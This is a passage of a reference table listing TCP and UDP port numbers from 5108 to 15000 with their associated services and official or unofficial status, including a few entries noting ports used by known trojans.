5108 	TCP 		VPOP3 Mail Server Webmail[citation needed] 	Unofficial
5109 	TCP 	UDP 	VPOP3 Mail Server Status[citation needed] 	Unofficial
5110 	TCP 		ProRat Server 	Unofficial
5121 	TCP 		Neverwinter Nights 	Unofficial
5124 	TCP 	UDP 	TorgaNET (Government Darknet) 	Unofficial
5150 	TCP 	UDP 	ATMP Ascend Tunnel Management Protocol[64] 	Official
5150 	TCP 	UDP 	Malware Cerberus RAT[citation needed] 	Unofficial
5151 	TCP 		ESRI SDE Instance 	Official
5151 		UDP 	ESRI SDE Remote Start 	Official
5154 	TCP 	UDP 	BZFlag 	Official
5176 	TCP 		ConsoleWorks default UI interface[citation needed] 	Unofficial
5190 	TCP 		ICQ and AOL Instant Messenger 	Official
5222 	TCP 		Extensible Messaging and Presence Protocol (XMPP) client connection[65][66] 	Official
5223 	TCP 		Extensible Messaging and Presence Protocol (XMPP) client connection over SSL 	Unofficial
5228 	TCP 		HP Virtual Room Service 	Official
5228 	TCP 		Android Market 	Unofficial
5246 		UDP 	Control And Provisioning of Wireless Access Points (CAPWAP) CAPWAP control[67] 	Official
5247 		UDP 	Control And Provisioning of Wireless Access Points (CAPWAP) CAPWAP data[67] 	Official
5269 	TCP 		Extensible Messaging and Presence Protocol (XMPP) server connection[65][66] 	Official
5280 	TCP 		Extensible Messaging and Presence Protocol (XMPP) XEP-0124: Bidirectional-streams Over Synchronous HTTP (BOSH) 	Official
5281 	TCP 		Undo License Manager 	Official
5281 	TCP 		Extensible Messaging and Presence Protocol (XMPP)[68] 	Unofficial
5298 	TCP 	UDP 	Extensible Messaging and Presence Protocol (XMPP)[69] 	Official
5310 	TCP 	UDP 	Outlaws (1997 video game). Both UDP and TCP are reserved, but only UDP is used 	Official
5310 	TCP 	UDP 	Ginever.net data communication port[citation needed] 	Unofficial
5311 	TCP 	UDP 	Ginever.net data communication port[citation needed] 	Unofficial
5312 	TCP 	UDP 	Ginever.net data communication port[citation needed] 	Unofficial
5313 	TCP 	UDP 	Ginever.net data communication port[citation needed] 	Unofficial
5314 	TCP 	UDP 	Ginever.net data communication port[citation needed] 	Unofficial
5315 	TCP 	UDP 	Ginever.net data communication port[citation needed] 	Unofficial
5349 	TCP 		STUN, a protocol for NAT traversal (UDP is reserved)[48] 	Official
5349 	TCP 		TURN, a protocol for NAT traversal (UDP is reserved)[49] 	Official
5351 	TCP 	UDP 	NAT Port Mapping Protocol—client-requested configuration for inbound connections through network address translators 	Official
5353 		UDP 	Multicast DNS (mDNS) 	Official
5355 	TCP 	UDP 	LLMNR—Link-Local Multicast Name Resolution, allows hosts to perform name resolution for hosts on the same local link (only provided by Windows Vista and Server 2008) 	Official
5357 	TCP 	UDP 	Web Services for Devices (WSDAPI) (only provided by Windows Vista, Windows 7 and Server 2008) 	Unofficial
5358 	TCP 	UDP 	WSDAPI Applications to Use a Secure Channel (only provided by Windows Vista, Windows 7 and Server 2008) 	Unofficial
5394 		UDP 	Kega Fusion, a Sega multi-console emulator[70][71] 	Unofficial
5402 	TCP 	UDP 	mftp, Stratacache OmniCast content delivery system MFTP file sharing protocol 	Official
5405 	TCP 	UDP 	NetSupport Manager 	Official
5412 	TCP 	UDP 	IBM Rational Synergy (Telelogic Synergy) (Continuus CM) Message Router 	Official
5413 	TCP 	UDP 	Wonderware SuiteLink service 	Official
5421 	TCP 	UDP 	NetSupport Manager 	Official
5432 	TCP 	UDP 	PostgreSQL database system 	Official
5433 	TCP 		Bouwsoft file/webserver[72] 	Unofficial
5445 		UDP 	Cisco Unified Video Advantage[citation needed] 	Unofficial
5450 	TCP 		OSIsoft PI Server Client Access 	Unofficial
5457 	TCP 		OSIsoft PI Asset Framework Client Access 	Unofficial
5458 	TCP 		OSIsoft PI Notifications Client Access 	Unofficial
5495 	TCP 		Applix TM1 Admin server 	Unofficial
5498 	TCP 		Hotline tracker server connection 	Unofficial
5499 		UDP 	Hotline tracker server discovery 	Unofficial
5500 	TCP 		VNC remote desktop protocol—for incoming listening viewer, Hotline control connection 	Unofficial
5501 	TCP 		Hotline file transfer connection 	Unofficial
5517 	TCP 		Setiqueue Proxy server client for SETI@Home project 	Unofficial
5550 	TCP 		Hewlett-Packard Data Protector[citation needed] 	Unofficial
5555 	TCP 		Freeciv versions up to 2.0, Hewlett-Packard Data Protector, McAfee EndPoint Encryption Database Server, SAP, Default for Microsoft Dynamics CRM 4.0 	Unofficial
5556 	TCP 	UDP 	Freeciv 	Official
5591 	TCP 		Default for Tidal Enterprise Scheduler master-Socket used for communication between Agent-to-Master, though can be changed[citation needed] 	Unofficial
5631 	TCP 		pcANYWHEREdata, Symantec pcAnywhere (version 7.52 and later[73])[74] data 	Official
5632 		UDP 	pcANYWHEREstat, Symantec pcAnywhere (version 7.52 and later) status 	Official
5656 	TCP 		IBM Lotus Sametime p2p file transfer 	Unofficial
5666 	TCP 		NRPE (Nagios) 	Unofficial
5667 	TCP 		NSCA (Nagios) 	Unofficial
5678 		UDP 	Mikrotik RouterOS Neighbor Discovery Protocol (MNDP) 	Unofficial
5721 	TCP 	UDP 	Kaseya[citation needed] 	Unofficial
5723 	TCP 		Operations Manager[75] 	Unofficial
5741 	TCP 	UDP 	IDA Discover Port 1 	Official
5742 	TCP 	UDP 	IDA Discover Port 2 	Official
5800 	TCP 		VNC remote desktop protocol—for use over HTTP 	Unofficial
5814 	TCP 	UDP 	Hewlett-Packard Support Automation (HP OpenView Self-Healing Services)[citation needed] 	Official
5850 	TCP 		COMIT SE (PCR)[citation needed] 	Unofficial
5852 	TCP 		Adeona client: communications to OpenDHT[citation needed] 	Unofficial
5900 	TCP 	UDP 	Virtual Network Computing (VNC) remote desktop protocol (used by Apple Remote Desktop and others) 	Official
5912 	TCP 		Default for Tidal Enterprise Scheduler agent-Socket used for communication between Master-to-Agent, though can be changed[citation needed] 	Unofficial
5938 	TCP 	UDP 	TeamViewer remote desktop protocol 	Unofficial
5984 	TCP 	UDP 	CouchDB database server 	Official
5999 	TCP 		CVSup file update tool[76] 	Official
6000 	TCP 		X11—used between an X client and server over the network 	Official
6001 		UDP 	X11—used between an X client and server over the network 	Official
6005 	TCP 		Default for BMC Software Control-M/Server—Socket used for communication between Control-M processes—though often changed during installation 	Official
6005 	TCP 		Default for Camfrog chat & cam client 	Unofficial
6050 	TCP 		Arcserve backup 	Unofficial
6050 	TCP 		Nortel software[citation needed] 	Unofficial
6051 	TCP 		Arcserve backup 	Unofficial
6072 	TCP 		iOperator Protocol Signal Port[citation needed] 	Unofficial
6086 	TCP 		PDTP—FTP like file server in a P2P network 	Official
6100 	TCP 		Vizrt System 	Unofficial
6100 	TCP 		Ventrilo This is the authentication port that must be allowed outbound for version 3 of Ventrilo 	Official
6101 	TCP 		Backup Exec Agent Browser[citation needed] 	Unofficial
6110 	TCP 	UDP 	softcm, HP Softbench CM 	Official
6111 	TCP 	UDP 	spc, HP Softbench Sub-Process Control 	Official
6112 		UDP 	"dtspcd"—a network daemon that accepts requests from clients to execute commands and launch applications remotely 	Official
6112 	TCP 		"dtspcd"—a network daemon that accepts requests from clients to execute commands and launch applications remotely 	Official
6112 	TCP 		Blizzard's Battle.net gaming service, ArenaNet gaming service, Relic gaming service 	Unofficial
6112 	TCP 		Club Penguin Disney online game for kids 	Unofficial
6113 	TCP 		Club Penguin Disney online game for kids 	Unofficial
6129 	TCP 		DameWare Remote Control 	Official
6257 		UDP 	WinMX (see also 6699) 	Unofficial
6260 	TCP 	UDP 	planet M.U.L.E. 	Unofficial
6262 	TCP 		Sybase Advantage Database Server 	Unofficial
6324 	TCP 	UDP 	Hall Research Device discovery and configuration 	Official
6343 		UDP 	SFlow, sFlow traffic monitoring 	Official
6346 	TCP 	UDP 	gnutella-svc, gnutella (FrostWire, Limewire, Shareaza, etc.) 	Official
6347 	TCP 	UDP 	gnutella-rtr, Gnutella alternate 	Official
6350 	TCP 	UDP 	App Discovery and Access Protocol 	Official
6389 	TCP 		EMC CLARiiON 	Unofficial
6432 	TCP 		PgBouncer - A connection pooler for PostgreSQL 	Official
6444 	TCP 	UDP 	Sun Grid Engine—Qmaster Service 	Official
6445 	TCP 	UDP 	Sun Grid Engine—Execution Service 	Official
6502 	TCP 	UDP 	Netop Business Solutions - NetOp Remote Control 	Unofficial
6503 		UDP 	Netop Business Solutions - NetOp School[citation needed] 	Unofficial
6515 	TCP 	UDP 	Elipse RPC Protocol (REC) 	Official
6522 	TCP 		Gobby (and other libobby-based software) 	Unofficial
6523 	TCP 		Gobby 0.5 (and other libinfinity-based software) 	Unofficial
6543 		UDP 	Paradigm Research & Development Jetnet[77] default 	Unofficial
6566 	TCP 		SANE (Scanner Access Now Easy)—SANE network scanner daemon 	Unofficial
6560-6561 	TCP 		Speech-Dispatcher daemon 	Unofficial
6571 			Windows Live FolderShare client 	Unofficial
6600 	TCP 		Music Playing Daemon (MPD) 	Unofficial
6619 	TCP 	UDP 	odette-ftps, Odette File Transfer Protocol (OFTP) over TLS/SSL 	Official
6646 		UDP 	McAfee Network Agent[citation needed] 	Unofficial
6660–6664 	TCP 		Internet Relay Chat (IRC) 	Unofficial
6665–6669 	TCP 		Internet Relay Chat (IRC) 	Official
6679 	TCP 	UDP 	Osorno Automation Protocol (OSAUT) 	Official
6679 	TCP 		IRC SSL (Secure Internet Relay Chat)—often used 	Unofficial
6697 	TCP 		IRC SSL (Secure Internet Relay Chat)—often used 	Unofficial
6699 	TCP 		WinMX (see also 6257) 	Unofficial
6702 	TCP 		Default for Tidal Enterprise Scheduler client-Socket used for communication between Client-to-Master, though can be changed[citation needed] 	Unofficial
6771 		UDP 	Polycom server broadcast[citation needed] 	Unofficial
6789 	TCP 		Campbell Scientific Loggernet Software[78] 	Unofficial
6881–6887 	TCP 	UDP 	BitTorrent part of full range of ports used most often 	Unofficial
6888 	TCP 	UDP 	MUSE 	Official
6888 	TCP 	UDP 	BitTorrent part of full range of ports used most often 	Unofficial
6889–6890 	TCP 	UDP 	BitTorrent part of full range of ports used most often 	Unofficial
6891–6900 	TCP 	UDP 	BitTorrent part of full range of ports used most often 	Unofficial
6891–6900 	TCP 	UDP 	Windows Live Messenger (File transfer) 	Unofficial
6901 	TCP 	UDP 	Windows Live Messenger (Voice) 	Unofficial
6901 	TCP 	UDP 	BitTorrent part of full range of ports used most often 	Unofficial
6902–6968 	TCP 	UDP 	BitTorrent part of full range of ports used most often 	Unofficial
6969 	TCP 	UDP 	acmsoda 	Official
6969 	TCP 		BitTorrent tracker 	Unofficial
6970–6999 	TCP 	UDP 	BitTorrent part of full range of ports used most often 	Unofficial
7000 	TCP 		Default for Vuze's built in HTTPS Bittorrent Tracker 	Unofficial
7000 	TCP 		Avira Server Management Console 	Unofficial
7001 	TCP 		Avira Server Management Console 	Unofficial
7001 	TCP 		Default for BEA WebLogic Server's HTTP server, though often changed during installation 	Unofficial
7002 	TCP 		Default for BEA WebLogic Server's HTTPS server, though often changed during installation 	Unofficial
7005 	TCP 		Default for BMC Software Control-M/Server and Control-M/Agent for Agent-to-Server, though often changed during installation 	Unofficial
7006 	TCP 		Default for BMC Software Control-M/Server and Control-M/Agent for Server-to-Agent, though often changed during installation 	Unofficial
7010 	TCP 		Default for Cisco AON AMC (AON Management Console) [79] 	Unofficial
7022 	TCP 		Database mirroring endpoints[citation needed] 	Unofficial
7023 		UDP 	Bryan Wilcutt T2-NMCS Protocol for SatCom Modems 	Official
7025 	TCP 		Zimbra LMTP [mailbox]—local mail delivery 	Unofficial
7047 	TCP 		Zimbra conversion server 	Unofficial
7133 	TCP 		Enemy Territory: Quake Wars 	Unofficial
7144 	TCP 		Peercast[citation needed] 	Unofficial
7145 	TCP 		Peercast[citation needed] 	Unofficial
7171 	TCP 		Tibia 	Unofficial
7306 	TCP 		Zimbra mysql [mailbox][citation needed] 	Unofficial
7307 	TCP 		Zimbra mysql [logger][citation needed] 	Unofficial
7312 		UDP 	Sibelius License Server 	Unofficial
7400 	TCP 	UDP 	RTPS (Real Time Publish Subscribe) DDS Discovery 	Official
7401 	TCP 	UDP 	RTPS (Real Time Publish Subscribe) DDS User-Traffic 	Official
7402 	TCP 	UDP 	RTPS (Real Time Publish Subscribe) DDS Meta-Traffic 	Official
7473 	TCP 	UDP 	Rise: The Vieneo Province 	Official
7547 	TCP 	UDP 	CPE WAN Management Protocol Technical Report 069 	Official
7615 	TCP 		ISL Online[80] communication protocol 	Unofficial
7624 	TCP 	UDP 	Instrument Neutral Distributed Interface 	Official
7652-7654 	TCP 		I2P anonymizing overlay network 	Unofficial
7655 		UDP 	I2P SAM Bridge Socket API 	Unofficial
7656-7660 	TCP 		I2P anonymizing overlay network 	Unofficial
7670 	TCP 		BrettspielWelt BSW Boardgame Portal 	Unofficial
7676 	TCP 		Aqumin AlphaVision Remote Command Interface[citation needed] 	Unofficial
7700 		UDP 	P2P DC (RedHub)[citation needed] 	Unofficial
7707 		UDP 	Killing Floor 	Unofficial
7708 		UDP 	Killing Floor 	Unofficial
7717 		UDP 	Killing Floor 	Unofficial
7777 	TCP 		iChat server file transfer proxy 	Unofficial
7777 	TCP 		Oracle Cluster File System 2[citation needed] 	Unofficial
7777 	TCP 		Windows backdoor program tini.exe default[citation needed] 	Unofficial
7777 	TCP 		Xivio default Chat Server[citation needed] 	Unofficial
7777 	TCP 		Terraria default server 	Unofficial
7777 		UDP 	San Andreas Multiplayer default server 	Unofficial
7778 	TCP 		Bad Trip MUD[citation needed] 	Unofficial
7777-7788 		UDP 	Unreal Tournament series default server[citation needed] 	Unofficial
7777-7788 	TCP 		Unreal Tournament series default server[citation needed] 	Unofficial
7787-7788 	TCP 		GFI EventsManager 7 & 8[citation needed] 	Official
7831 	TCP 		Default used by Smartlaunch Internet Cafe Administration[81] software 	Unofficial
7880 	TCP 	UDP 	PowerSchool Gradebook Server[citation needed] 	Unofficial
7890 	TCP 		Default that will be used by the iControl Internet Cafe Suite Administration software 	Unofficial
7915 	TCP 		Default for YSFlight server[82] 	Unofficial
7935 	TCP 		Fixed port used for Adobe Flash Debug Player to communicate with a debugger (Flash IDE, Flex Builder or fdb).[83] 	Unofficial
7937-9936 	TCP 	UDP 	EMC2 (Legato) Networker or Sun Solstice Backup 	Official
8000 		UDP 	iRDMI (Intel Remote Desktop Management Interface)[84]—sometimes erroneously used instead of port 8080 	Official
8000 	TCP 		iRDMI (Intel Remote Desktop Management Interface)[84]—sometimes erroneously used instead of port 8080 	Official
8000 	TCP 		Commonly used for internet radio streams such as those using SHOUTcast 	Unofficial
8000 	TCP 		FreemakeVideoCapture service a part of Freemake Video Downloader [85] 	Unofficial
8001 	TCP 		Commonly used for internet radio streams such as those using SHOUTcast 	Unofficial
8002 	TCP 		Cisco Systems Unified Call Manager Intercluster[citation needed] 	Unofficial
8008 	TCP 		HTTP Alternate 	Official
8008 	TCP 		IBM HTTP Server administration default 	Unofficial
8009 	TCP 		ajp13—Apache JServ Protocol AJP Connector 	Unofficial
8010 	TCP 		XMPP File transfers 	Unofficial
8011-8013 	TCP 		HTTP/TCP Symon Communications Event and Query Engine[citation needed] 	Unofficial
8014 	TCP 		HTTP/TCP Symon Communications Event and Query Engine[citation needed] 	Unofficial
8014 	TCP 	UDP 	Perseus SDR Receiver default remote connection port[citation needed] 	Unofficial
8020 	TCP 		360Works SuperContainer[86] 	Unofficial
8074 	TCP 		Gadu-Gadu 	Unofficial
8075 	TCP 		Killing Floor 	Unofficial
8078 	TCP 	UDP 	Default port for most Endless Online-based servers[citation needed] 	Unofficial
8080 	TCP 		HTTP alternate (http_alt)—commonly used for Web proxy and caching server, or for running a Web server as a non-root user 	Official
8080 	TCP 		Apache Tomcat 	Unofficial
8080 		UDP 	FilePhile Master/Relay 	Unofficial
8081 	TCP 		HTTP alternate, VibeStreamer, e.g. McAfee ePolicy Orchestrator (ePO) 	Unofficial
8086 	TCP 		HELM Web Host Automation Windows Control Panel 	Unofficial
8086 	TCP 		Kaspersky AV Control Center 	Unofficial
8087 	TCP 		Hosting Accelerator Control Panel 	Unofficial
8087 	TCP 		Parallels Plesk Control Panel 	Unofficial
8087 		UDP 	Kaspersky AV Control Center 	Unofficial
8088 	TCP 		Asterisk (PBX) Web Configuration utility (GUI Addon) 	Unofficial
8089 	TCP 		Splunk Daemon 	Unofficial
8090 	TCP 		HTTP Alternate (http_alt_alt)—used as an alternative to port 8080[citation needed] 	Unofficial
8100 	TCP 		Console Gateway License Verification 	Unofficial
8116 		UDP 	Check Point Cluster Control Protocol 	Unofficial
8118 	TCP 		Privoxy—advertisement-filtering Web proxy 	Official
8123 	TCP 		Polipo Web proxy 	Official
8192 	TCP 		Sophos Remote Management System 	Unofficial
8193 	TCP 		Sophos Remote Management System 	Unofficial
8194 	TCP 		Sophos Remote Management System 	Unofficial
8194 	TCP 		Bloomberg Application[citation needed] 	Unofficial
8195 	TCP 		Bloomberg Application[citation needed] 	Unofficial
8200 	TCP 		GoToMyPC 	Unofficial
8222 	TCP 		VMware Server Management User Interface[87] (insecure Web interface).[88] See also port 8333 	Unofficial
8243 	TCP 	UDP 	HTTPS listener for Apache Synapse [89] 	Official
8280 	TCP 	UDP 	HTTP listener for Apache Synapse [89] 	Official
8291 	TCP 		Winbox—Default on a MikroTik RouterOS for a Windows application used to administer MikroTik RouterOS[citation needed] 	Unofficial
8303 		UDP 	Teeworlds Server 	Unofficial
8331 	TCP 		MultiBit, [7] 	Unofficial
8332 	TCP 		Bitcoin JSON-RPC server[90] 	Unofficial
8333 	TCP 		Bitcoin[91] 	Unofficial
8333 	TCP 		VMware Server Management User Interface[87] (secure Web interface).[88] See also port 8222 	Unofficial
8400 	TCP 	UDP 	cvp, Commvault Unified Data Management 	Official
8442 	TCP 	UDP 	CyBro A-bus, Cybrotech Ltd. 	Official
8443 	TCP 		SW Soft Plesk Control Panel, Apache Tomcat SSL, Promise WebPAM SSL, McAfee ePolicy Orchestrator (ePO) 	Unofficial
8484 	TCP 	UDP 	MapleStory 	Unofficial
8500 	TCP 	UDP 	ColdFusion Macromedia/Adobe ColdFusion default and Duke Nukem 3D—default 	Unofficial
8501 	TCP 		[8] DukesterX —default[citation needed] 	Unofficial
8601 	TCP 		Wavestore CCTV protocol[92] 	Unofficial
8602 	TCP 	UDP 	Wavestore Notification protocol[92] 	Unofficial
8642 	TCP 		Lotus Traveller[citation needed] 	Unofficial
8691 	TCP 		Ultra Fractal default server port for distributing calculations over network computers 	Unofficial
8701 		UDP 	SoftPerfect Bandwidth Manager 	Unofficial
8702 		UDP 	SoftPerfect Bandwidth Manager 	Unofficial
8767 		UDP 	TeamSpeak—default 	Unofficial
8768 		UDP 	TeamSpeak—alternate 	Unofficial
8778 	TCP 		EPOS Speech Synthesis System 	Unofficial
8834 			Nessus web 	Unofficial
8840 	TCP 		Opera Unite server 	Unofficial
8880 		UDP 	cddbp-alt, CD DataBase (CDDB) protocol (CDDBP) alternate 	Official
8880 	TCP 		cddbp-alt, CD DataBase (CDDB) protocol (CDDBP) alternate 	Official
8880 	TCP 		WebSphere Application Server SOAP connector default 	Unofficial
8880 	TCP 		Win Media Streamer to Server SOAP connector default 	Unofficial
8881 	TCP 		Atlasz Informatics Research Ltd Secure Application Server[citation needed] 	Unofficial
8881 	TCP 		Netflexity Inc QFlex - IBM WebSphere MQ monitoring software. 	Unofficial
8882 	TCP 		Atlasz Informatics Research Ltd Secure Application Server[citation needed] 	Unofficial
8883 	TCP 	UDP 	Secure MQ Telemetry Transport (MQTT over SSL) 	Official
8886 	TCP 		PPM3 (Padtec Management Protocol version 3) 	Unofficial
8887 	TCP 		HyperVM HTTP 	Official
8888 	TCP 		HyperVM HTTPS 	Official
8888 	TCP 		Freenet HTTP 	Unofficial
8888 	TCP 	UDP 	NewsEDGE server 	Official
8888 	TCP 		Sun Answerbook dwhttpd server (deprecated by docs.sun.com) 	Unofficial
8888 	TCP 		GNUmp3d HTTP music streaming and Web interface 	Unofficial
8888 	TCP 		LoLo Catcher HTTP Web interface (www.optiform.com) 	Unofficial
8888 	TCP 		D2GS Admin Console Telnet administration console for D2GS servers (Diablo 2) 	Unofficial
8888 	TCP 		Earthland Relams 2 Server (AU1_2)[citation needed] 	Unofficial
8888 	TCP 		MAMP Server 	Unofficial
8889 	TCP 		MAMP Server 	Unofficial
8889 	TCP 		Earthland Relams 2 Server (AU1_1)[citation needed] 	Unofficial
8983 	TCP 		Default for Apache Solr 1.4[citation needed] 	Unofficial
8998 	TCP 		I2P Monotone Repository 	Unofficial
9000 	TCP 		Buffalo LinkSystem Web access[citation needed] 	Unofficial
9000 	TCP 		DBGp 	Unofficial
9000 	TCP 		SqueezeCenter web server & streaming 	Unofficial
9000 		UDP 	UDPCast 	Unofficial
9000 	TCP 		Play! Framework web server[citation needed] 	Unofficial
9001 	TCP 	UDP 	ETL Service Manager[93] 	Official
9001 			Microsoft SharePoint authoring environment 	Unofficial
9001 			cisco-xremote router configuration[citation needed] 	Unofficial
9001 			Tor network default 	Unofficial
9001 	TCP 		DBGp Proxy 	Unofficial
9001 	TCP 		HSQLDB default port 	Unofficial
9009 	TCP 	UDP 	Pichat Server—Peer to peer chat software 	Official
9010 	TCP 		TISERVICEMANAGEMENT Numara Track-It! 	Unofficial
9020 	TCP 		WiT WiT Services 	Official
9025 	TCP 		WiT WiT Services 	Official
9030 	TCP 		Tor often used 	Unofficial
9043 	TCP 		WebSphere Application Server Administration Console secure 	Unofficial
9050 	TCP 		Tor 	Unofficial
9051 	TCP 		Tor 	Unofficial
9060 	TCP 		WebSphere Application Server Administration Console 	Unofficial
9080 		UDP 	glrpc, Groove Collaboration software GLRPC 	Official
9080 	TCP 		glrpc, Groove Collaboration software GLRPC 	Official
9080 	TCP 		WebSphere Application Server HTTP Transport (port 1) default 	Unofficial
9090 	TCP 	UDP 	WebSM 	Unofficial
9090 	TCP 		Webwasher, Secure Web, McAfee Web Gateway - Default Proxy Port[citation needed] 	Unofficial
9090 	TCP 		Openfire Administration Console 	Unofficial
9090 	TCP 		SqueezeCenter control (CLI) 	Unofficial
9091 	TCP 		Openfire Administration Console (SSL Secured) 	Unofficial
9091 	TCP 		Transmission (BitTorrent client) Web Interface 	Unofficial
9100 	TCP 		PDL Data Stream 	Official
9101 	TCP 	UDP 	Bacula Director 	Official
9102 	TCP 	UDP 	Bacula File Daemon 	Official
9103 	TCP 	UDP 	Bacula Storage Daemon 	Official
9105 	TCP 	UDP 	Xadmin Control Daemon 	Official
9106 	TCP 	UDP 	Astergate Control Daemon 	Official
9107 	TCP 		Astergate-FAX Control Daemon 	Official
9110 		UDP 	SSMP Message protocol 	Unofficial
9119 	TCP 	UDP 	MXit Instant Messenger 	Official
9191 	TCP 		Catamount Software - PocketMoney Sync[citation needed] 	Unofficial
9199 	TCP 		Avtex LLC - qStats 	Unofficial
9293 	TCP 		Sony PlayStation RemotePlay[citation needed] 	Unofficial
9300 	TCP 		IBM Cognos 8 SOAP Business Intelligence and Performance Management 	Unofficial
9303 		UDP 	D-Link Shareport Share storage and MFP printers 	Unofficial
9306 	TCP 		Sphinx Native API 	Official
9312 	TCP 		Sphinx SphinxQL 	Official
9418 	TCP 	UDP 	git, Git pack transfer service 	Official
9420 	TCP 		MooseFS distributed file system—master server to chunk servers 	Unofficial
9421 	TCP 		MooseFS distributed file system—master server to clients 	Unofficial
9422 	TCP 		MooseFS distributed file system—chunk servers to clients 	Unofficial
9535 	TCP 	UDP 	mngsuite, LANDesk Management Suite Remote Control 	Official
9536 	TCP 	UDP 	laes-bf, IP Fabrics Surveillance buffering function 	Official
9600 		UDP 	Omron FINS, OMRON FINS PLC communication 	Official
9675 	TCP 	UDP 	Spiceworks Desktop, IT Helpdesk Software 	Unofficial
9676 	TCP 	UDP 	Spiceworks Desktop, IT Helpdesk Software 	Unofficial
9695 		UDP 	CCNx 	Official
9800 	TCP 	UDP 	WebDAV Source 	Official
9800 			WebCT e-learning portal 	Unofficial
9875 	TCP 		Club Penguin Disney online game for kids 	Unofficial
9898 		UDP 	MonkeyCom[citation needed] 	Official
9898 	TCP 		MonkeyCom[citation needed] 	Official
9898 	TCP 		Tripwire—File Integrity Monitoring Software[citation needed] 	Unofficial
9987 		UDP 	TeamSpeak 3 server default (voice) port (for the conflicting service see the IANA list) 	Unofficial
9996 	TCP 	UDP 	Ryan's App "Ryan's App" Trading Software 	Official
9996 	TCP 	UDP 	The Palace "The Palace" Virtual Reality Chat software.—5 	Official
9998 	TCP 	UDP 	The Palace "The Palace" Virtual Reality Chat software.—5 	Official
9999 			Hydranode—edonkey2000 TELNET control 	Unofficial
9999 	TCP 		Lantronix UDS-10/UDS100[94] RS-485 to Ethernet Converter TELNET control 	Unofficial
9999 			Urchin Web Analytics[citation needed] 	Unofficial
10000 			Webmin—Web-based Linux admin tool 	Unofficial
10000 			BackupExec 	Unofficial
10000 			Ericsson Account Manager (avim)[citation needed] 	Unofficial
10001 	TCP 		Lantronix UDS-10/UDS100[95] RS-485 to Ethernet Converter default 	Unofficial
10008 	TCP 	UDP 	Octopus Multiplexer, primary port for the CROMP protocol, which provides a platform-independent means for communication of objects across a network 	Official
10009 	TCP 	UDP 	Cross Fire, a multiplayer online First Person Shooter[citation needed] 	Unofficial
10010 	TCP 		Open Object Rexx (ooRexx) rxapi daemon 	Official
10017 			AIX,NeXT, HPUX—rexd daemon control[citation needed] 	Unofficial
10024 	TCP 		Zimbra smtp [mta]—to amavis from postfix[citation needed] 	Unofficial
10025 	TCP 		Zimbra smtp [mta]—back to postfix from amavis[citation needed] 	Unofficial
10050 	TCP 	UDP 	Zabbix-Agent 	Official
10051 	TCP 	UDP 	Zabbix-Trapper 	Official
10110 	TCP 	UDP 	NMEA 0183 Navigational Data. Transport of NMEA 0183 sentences over TCP or UDP 	Official
10113 	TCP 	UDP 	NetIQ Endpoint 	Official
10114 	TCP 	UDP 	NetIQ Qcheck 	Official
10115 	TCP 	UDP 	NetIQ Endpoint 	Official
10116 	TCP 	UDP 	NetIQ VoIP Assessor 	Official
10172 	TCP 		Intuit Quickbooks client 	Unofficial
10200 	TCP 		FRISK Software International's fpscand virus scanning daemon for Unix platforms [96] 	Unofficial
10200 	TCP 		FRISK Software International's f-protd virus scanning daemon for Unix platforms [97] 	Unofficial
10201–10204 	TCP 		FRISK Software International's f-protd virus scanning daemon for Unix platforms [97] 	Unofficial
10301 	TCP 		VoiceIP-ACS UMP default device provisioning endpoint[citation needed] 	Unofficial
10302 	TCP 		VoiceIP-ACS UMP default device provisioning endpoint (SSL)[citation needed] 	Unofficial
10308 			Lock-on: Modern Air Combat[citation needed] 	Unofficial
10480 			SWAT 4 Dedicated Server[citation needed] 	Unofficial
10823 		UDP 	Farming Simulator 2011 Default Server[citation needed] 	Unofficial
10891 	TCP 		Jungle Disk (this port is opened by the Jungle Disk Monitor service on the localhost)[citation needed] 	Unofficial
11001 	TCP 	UDP 	metasys ( Johnson Controls Metasys java AC control environment )[citation needed] 	Unofficial
11211 	TCP 	UDP 	memcached 	Unofficial
11235 			Savage:Battle for Newerth Server Hosting[citation needed] 	Unofficial
11294 			Blood Quest Online Server[citation needed] 	Unofficial
11371 			OpenPGP HTTP key server 	Official
11576 			IPStor Server management communication 	Unofficial
12010 	TCP 		ElevateDB default database port [98] 	Unofficial
12011 	TCP 		Axence nVision[citation needed] 	Unofficial
12012 	TCP 		Axence nVision[citation needed] 	Unofficial
12012 	TCP 		Audition Online Dance Battle, Korea Server—Status/Version Check 	Unofficial
12012 		UDP 	Audition Online Dance Battle, Korea Server—Status/Version Check 	Unofficial
12013 	TCP 	UDP 	Audition Online Dance Battle, Korea Server 	Unofficial
12035 		UDP 	Linden Lab viewer to sim on SecondLife[citation needed] 	Unofficial
12222 		UDP 	Light Weight Access Point Protocol (LWAPP) LWAPP data (RFC 5412) 	Official
12223 		UDP 	Light Weight Access Point Protocol (LWAPP) LWAPP control (RFC 5412) 	Official
12345 			NetBus—remote administration tool (often Trojan horse). Also used by NetBuster. Little Fighter 2 (TCP). 	Unofficial
12489 	TCP 		NSClient/NSClient++/NC_Net (Nagios) 	Unofficial
12975 	TCP 		LogMeIn Hamachi (VPN tunnel software; also port 32976)—used to connect to Mediation Server (bibi.hamachi.cc); will attempt to use SSL (TCP port 443) if both 12975 & 32976 fail to connect 	Unofficial
12998–12999 		UDP 	Takenaka RDI Mirror World on SecondLife[citation needed] 	Unofficial
13000–13050 		UDP 	Linden Lab viewer to sim on SecondLife[citation needed] 	Unofficial
13008 	TCP 	UDP 	Cross Fire, a multiplayer online First Person Shooter[citation needed] 	Unofficial
13075 	TCP 		Default[99] for BMC Software Control-M/Enterprise Manager Corba communication, though often changed during installation 	Official
13195-13196 	TCP 	UDP 	Ontolux Ontolux 2D 	Unofficial
13337-13340 	TCP 	UDP 	ÆtherNet peer-to-peer networking[citation needed] 	Unofficial
13720 	TCP 	UDP 	Symantec NetBackup—bprd (formerly VERITAS) 	Official
13721 	TCP 	UDP 	Symantec NetBackup—bpdbm (formerly VERITAS) 	Official
13724 	TCP 	UDP 	Symantec Network Utility—vnetd (formerly VERITAS) 	Official
13782 	TCP 	UDP 	Symantec NetBackup—bpcd (formerly VERITAS) 	Official
13783 	TCP 	UDP 	Symantec VOPIED protocol (formerly VERITAS) 	Official
13785 	TCP 	UDP 	Symantec NetBackup Database—nbdb (formerly VERITAS) 	Official
13786 	TCP 	UDP 	Symantec nomdb (formerly VERITAS) 	Official
14439 	TCP 		APRS UI-View Amateur Radio[100] UI-WebServer 	Unofficial
14567 		UDP 	Battlefield 1942 and mods 	Unofficial
14900 	TCP 		K3 SYSPRO K3 Framework WCF Backbone[citation needed] 	Unofficial
15000 	TCP 		psyBNC 	Unofficial
15000 	TCP 		Wesnoth 	Unofficial
15000 	TCP 		Kaspersky Network Agent[citation needed] 	Unofficial
